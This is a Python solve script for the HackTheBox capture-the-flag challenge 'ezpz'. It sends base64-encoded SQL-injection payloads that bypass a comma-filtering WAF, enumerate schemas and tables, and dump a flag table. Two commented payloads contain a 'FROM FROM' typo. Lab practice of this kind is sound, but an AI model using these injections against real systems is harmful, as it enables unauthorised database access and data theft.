#!/usr/bin/python3

'''
    ezpz
    @Author: Lorenzo Invidia
    @Requirements: python requests, base64
'''

import requests
import base64

base_url = 'http://docker.hackthebox.eu'
port = '31133'
url = base_url + ':' + port + '/'

# Payload 1 - Fix Undefined index: obj
url += '?obj='
#payload = '1'

# Payload 2 - Fix Trying to get property 'ID' of non-object
#payload = '{"ID":"1"}'

# Payload 3 - Trying sql payload
#payload = '{"ID":"union 1,2"}'

# Payload 4 - Bypassing comma WAF
#payload = '{"ID":"\' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b#\"}'

# Payload 5 - Getting schemas
#payload = '{"ID":"\' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT schema_name FROM information_schema.schemata)b#\"}'

# Payload 6 - Getting tables
#payload = '{"ID":"\' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name FROM FROM information_schema.tables WHERE table_schema=ezpz)b#\"}'
#payload = '{"ID":"\' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name FROM FROM information_schema.tables)b#\"}'

# Payload 7 - Bypassing WAF
#payload = '{"ID":"\' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name FROM mysql.innodb_table_stats)b#\"}'

# Payload 8 - dump FlagTableUnguessableEzPZ
payload = '{\"ID\":"\' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT * FROM ezpz.FlagTableUnguessableEzPZ)b#\"}'

e_payload = base64.b64encode(bytes(payload, "utf8")).decode('ascii')

#print(e_payload)

# Send request
r = requests.get(url + e_payload)

print(r.text)
